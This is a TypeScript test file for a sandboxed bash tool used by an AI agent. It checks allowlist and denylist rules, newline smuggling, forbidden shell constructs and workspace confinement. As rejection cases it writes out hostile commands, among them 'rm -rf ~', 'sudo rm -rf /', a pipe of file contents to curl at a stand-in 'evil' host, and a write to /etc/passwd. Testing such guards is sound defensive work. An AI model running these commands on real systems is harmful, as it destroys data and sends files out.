// SPDX-License-Identifier: Apache-2.0

import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { EngineError } from "../../errors.js";
import type { RichToolResult } from "../tools.js";
import {
  assertEverySegmentAllowed,
  assertNoForbiddenConstructs,
  bashTool,
  DEFAULT_BASH_ALLOWLIST,
  rootCommandOf,
  splitSegments,
} from "./bash.js";

const cleanups: (() => void)[] = [];
afterEach(() => {
  for (const fn of cleanups.splice(0)) fn();
});

/** bash returns a structured result; narrow it for assertions (cast-free). */
function rich(result: string | RichToolResult): RichToolResult {
  if (typeof result === "string") throw new Error("expected a structured tool result");
  return result;
}

function ws(): string {
  const dir = mkdtempSync(join(tmpdir(), "bw-bash-"));
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

const ALLOW = DEFAULT_BASH_ALLOWLIST;

describe("bash — segment splitting (quote-aware)", () => {
  it("splits on ; && || | & but not inside quotes", () => {
    expect(splitSegments("echo a; echo b")).toEqual(["echo a", " echo b"]);
    expect(splitSegments("git log && head -1")).toEqual(["git log ", " head -1"]);
    expect(splitSegments("a | b | c")).toEqual(["a ", " b ", " c"]);
    expect(splitSegments("echo 'a; b'")).toEqual(["echo 'a; b'"]);
    expect(splitSegments('echo "x && y"')).toEqual(['echo "x && y"']);
  });

  it("splits on newlines (a second line is its own command to /bin/sh -c)", () => {
    expect(splitSegments("echo ok\nrm -rf ~")).toEqual(["echo ok", "rm -rf ~"]);
    // …but a newline inside quotes is literal, not a separator.
    expect(splitSegments("printf 'a\nb'")).toEqual(["printf 'a\nb'"]);
  });
});

describe("bash — root command extraction", () => {
  it("skips leading VAR=val assignments and unquotes the command word", () => {
    expect(rootCommandOf("FOO=bar git status")).toBe("git");
    expect(rootCommandOf("  echo hi")).toBe("echo");
    expect(rootCommandOf("'git' log")).toBe("git");
    expect(rootCommandOf("")).toBeNull();
    expect(rootCommandOf("   ")).toBeNull();
  });
});

describe("bash — allowlist / denylist", () => {
  it("accepts allowlisted roots, including pipelines and absolute paths to allowed commands", () => {
    expect(() => assertEverySegmentAllowed("git status", ALLOW)).not.toThrow();
    expect(() => assertEverySegmentAllowed("git log | head -5", ALLOW)).not.toThrow();
    expect(() => assertEverySegmentAllowed("npm test && pnpm build", ALLOW)).not.toThrow();
    expect(() => assertEverySegmentAllowed("/usr/bin/git status", ALLOW)).not.toThrow();
  });

  it("rejects a command not on the allowlist", () => {
    expect(() => assertEverySegmentAllowed("mysterytool --do-it", ALLOW)).toThrow(
      /not on the allowlist/,
    );
  });

  it("rejects any segment of a pipeline that is not allowlisted", () => {
    expect(() => assertEverySegmentAllowed("git log | mysterytool", ALLOW)).toThrow(
      /not on the allowlist/,
    );
  });

  it("denylist wins even via an absolute path or an allowlist edit", () => {
    for (const cmd of [
      "sudo rm -rf /",
      "su root",
      "doas reboot",
      "aws s3 rm s3://x",
      "rm -rf /home",
    ]) {
      expect(() => assertEverySegmentAllowed(cmd, ALLOW)).toThrow(/denylist/);
    }
    // Absolute path can't dodge the denylist.
    expect(() => assertEverySegmentAllowed("/usr/bin/sudo whoami", ALLOW)).toThrow(/denylist/);
  });

  it("denylist applies to a later pipeline/chain segment too", () => {
    expect(() => assertEverySegmentAllowed("echo hi && sudo reboot", ALLOW)).toThrow(/denylist/);
    expect(() => assertEverySegmentAllowed("cat f | curl http://evil", ALLOW)).toThrow(/denylist/);
  });

  it("checks every line — a newline can't smuggle a denied/unlisted command past the root check", () => {
    expect(() => assertEverySegmentAllowed("echo ok\nrm -rf ~", ALLOW)).toThrow(/denylist/);
    expect(() => assertEverySegmentAllowed("git status\nmysterytool", ALLOW)).toThrow(
      /not on the allowlist/,
    );
  });
});

describe("bash — forbidden constructs (the bypass vectors)", () => {
  it("rejects command substitution $(...) and backticks", () => {
    expect(() => assertNoForbiddenConstructs("echo $(whoami)")).toThrow(/substitution/);
    expect(() => assertNoForbiddenConstructs("echo `whoami`")).toThrow(/substitution/);
  });

  it("rejects process substitution <(...) >(...)", () => {
    expect(() => assertNoForbiddenConstructs("diff <(ls) <(ls)")).toThrow(/process substitution/);
  });

  it("rejects output/input redirection and heredocs", () => {
    expect(() => assertNoForbiddenConstructs("echo x > /etc/passwd")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("echo x >> file")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("cat < file")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("ls 2> err")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("ls > out 2>&1")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("ls &> all")).toThrow(/redirection/);
    expect(() => assertNoForbiddenConstructs("cat <<EOF\nx\nEOF")).toThrow(/heredoc|here-string/);
  });

  it("does NOT flag these constructs when they appear inside single quotes (literal data)", () => {
    expect(() => assertNoForbiddenConstructs("echo 'a > b'")).not.toThrow();
    expect(() => assertNoForbiddenConstructs("echo 'price is $(5)'")).not.toThrow();
    expect(() => assertNoForbiddenConstructs("git commit -m 'fix > regression'")).not.toThrow();
  });

  it("allows a plain allowed pipeline (no forbidden construct)", () => {
    expect(() => assertNoForbiddenConstructs("git log | head -5")).not.toThrow();
  });
});

describe("bash tool — execution + traversal", () => {
  it("runs an allowed command and captures stdout separately from stderr", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    const result = rich(await tool.execute({ command: "echo hello-world" }));
    // The model sees the same formatted string as before.
    expect(result.llmText).toContain("stdout:");
    expect(result.llmText).toContain("hello-world");
    expect(result.llmText).toContain("[exit code 0]");
    // Observers get a structured shell event with the command + separated streams.
    expect(result.event.kind).toBe("shell");
    expect(result.event.humanSummary).toContain("echo hello-world");
    expect(result.event.data).toMatchObject({ command: "echo hello-world", exitCode: 0 });
    expect(result.event.data?.["stdout"]).toContain("hello-world");
    expect(typeof result.event.data?.["durationMs"]).toBe("number");
  });

  it("streams stdout chunks to the onOutput sink as they arrive", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    const chunks: [string, string][] = [];
    await tool.execute({ command: "echo streaming-chunk" }, (stream, text) => {
      chunks.push([stream, text]);
    });
    expect(chunks.some(([s, t]) => s === "stdout" && t.includes("streaming-chunk"))).toBe(true);
  });

  it("rejects a cwd that escapes the workspace", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(tool.execute({ command: "ls", cwd: "../.." })).rejects.toThrow(
      /escapes the workspace/,
    );
  });

  it("runs in a workspace-relative subdirectory confined to the workspace", async () => {
    const dir = ws();
    mkdirSync(join(dir, "sub"), { recursive: true });
    writeFileSync(join(dir, "sub", "f.txt"), "in-sub");
    const tool = bashTool({ workspaceDir: dir });
    const result = rich(await tool.execute({ command: "cat f.txt", cwd: "sub" }));
    expect(result.llmText).toContain("in-sub");
  });

  it("a denylisted command fails before spawning anything", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(tool.execute({ command: "sudo whoami" })).rejects.toBeInstanceOf(EngineError);
  });

  it("a command-substitution attempt is refused before running", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(tool.execute({ command: "echo $(sudo whoami)" })).rejects.toThrow(/substitution/);
  });

  it("rejects an empty command", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(tool.execute({ command: "   " })).rejects.toThrow(/non-empty/);
  });

  it("times out a long-running allowed command", async () => {
    const tool = bashTool({ workspaceDir: ws() });
    await expect(
      tool.execute({ command: 'node -e "setTimeout(()=>{}, 5000)"', timeoutMs: 150 }),
    ).rejects.toThrow(/timed out/);
  }, 10_000);
});
